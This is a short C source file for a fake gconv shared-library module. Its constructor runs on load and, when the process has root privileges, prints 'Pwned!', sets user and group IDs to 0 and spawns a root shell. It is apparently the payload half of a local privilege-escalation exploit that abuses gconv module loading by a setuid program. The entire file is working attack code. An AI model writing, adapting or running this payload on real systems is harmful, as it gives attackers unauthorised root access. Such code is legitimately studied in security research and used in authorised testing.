/**
 * A fake gconv module (shared library) which runs arbitrary code when loaded by
 * the dynamic loader.
 */

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <syscall.h>
#include <sys/types.h>

void __attribute__ ((constructor)) init(void) {
	if (geteuid() == 0) {
		fputs("Pwned!\n", stderr);

		setuid(0);
		setgid(0);
		setegid(0);

		setenv("PATH", "/usr/local/bin:/usr/bin:/bin", 1);
		execvp("sh", (char *[]){"sh", NULL});
		perror("execvp failed");
	} else {
		fputs("Failed :(\n", stderr);
	}

	syscall(SYS_exit_group, 1);
}
